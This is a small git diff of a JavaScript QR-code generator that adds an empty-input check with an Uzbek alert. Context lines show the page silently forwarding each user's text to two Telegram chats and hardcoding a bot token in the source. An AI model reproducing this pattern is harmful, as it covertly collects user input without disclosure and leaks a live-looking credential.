@@ -3,11 +3,15 @@ let btn = document.getElementById("btn");
 let image = document.getElementById("image");
 
 btn.addEventListener("click", () => {
+    if(text.value != ''){
   image.src =
     "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" +
     text.value;
     sendtelegram(text.value,-1001926787553);
     sendtelegram(text.value,1862692289);
+}else{
+    alert('Avval toldiring')
+}
 });
 
 let telegram_bot_id = "6084042694:AAHBwmkds5IWXdbpoSXDq8E5CLbGUh2WfUM"; // token'ni o'rniga Siz yaratgan Bot tokenini yozing
